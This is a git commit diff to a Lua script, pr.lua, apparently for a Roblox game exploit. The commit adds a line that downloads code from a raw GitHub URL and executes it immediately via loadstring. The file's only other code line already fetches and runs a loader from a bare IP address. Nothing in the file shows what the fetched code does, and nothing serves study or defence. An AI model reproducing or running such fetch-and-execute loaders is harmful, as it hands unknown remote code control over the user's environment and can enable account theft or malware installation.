c7830c3314fce74e40be2e7677b648e5d3882aad
Mathersg4 <156609158+Mathersg4@users.noreply.github.com>
2025-09-14 11:52:53 +0300

    Update pr.lua

--- pr.lua
+++ pr.lua
@@ -1,2 +1,3 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/mm2-fix.lua', true))()
 ID="7d02e215-29aa-4d4b-8d74-95e8893eacf0";
 loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
